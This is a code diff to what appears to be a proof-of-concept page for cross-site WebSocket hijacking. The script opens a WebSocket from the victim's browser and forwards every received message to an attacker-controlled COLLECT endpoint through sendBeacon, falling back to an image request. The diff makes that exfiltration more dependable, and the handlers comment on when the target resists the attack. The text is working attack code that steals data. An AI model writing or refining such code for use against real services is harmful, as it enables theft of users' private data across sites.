@@ -29,8 +29,10 @@
   };
   ws.onmessage = (e) => {
     out.textContent = "Received " + (("" + e.data).length) + " bytes from the victim's socket; exfiltrated.";
-    try { navigator.sendBeacon(COLLECT, e.data); }
-    catch (x) { new Image().src = COLLECT + "?d=" + encodeURIComponent(e.data); }
+    // sendBeacon returns FALSE on failure/oversize (it does NOT throw) — check the return, else fall back.
+    var ok = false;
+    try { ok = navigator.sendBeacon(COLLECT, e.data); } catch (x) { ok = false; }
+    if (!ok) { new Image().src = COLLECT + "?d=" + encodeURIComponent(e.data); }
   };
   ws.onerror = () => { out.textContent = "WS error — endpoint may validate Origin (not CSWSH) or require a token."; };
   ws.onclose = (e) => { if (e.code === 1006) out.textContent += "  (closed 1006 — handshake likely rejected.)"; };
